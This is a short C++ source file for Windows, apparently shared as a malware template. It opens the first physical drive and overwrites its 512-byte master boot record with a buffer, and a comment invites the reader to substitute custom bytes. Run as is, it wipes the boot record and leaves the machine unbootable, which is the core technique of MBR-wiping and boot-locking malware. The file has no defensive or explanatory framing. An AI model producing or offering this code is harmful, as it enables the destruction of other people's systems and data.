//vibin since '26.
// - GMrt
#include <iostream>
#include <windows.h>

int main() {
    unsigned char MasterBootRec[512] = { 0 }; //replace the 0 with your bytes
    DWORD MbrSize = sizeof(MasterBootRec);
  
    HANDLE mbr = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

    if (mbr == INVALID_HANDLE_VALUE) { return 1; }

    DWORD lpNumberOfBytesWritten = 0;
    BOOL result = WriteFile(mbr, MasterBootRec, MbrSize, &lpNumberOfBytesWritten, NULL);

    CloseHandle(mbr);
    return 0;
}

//end ofsource
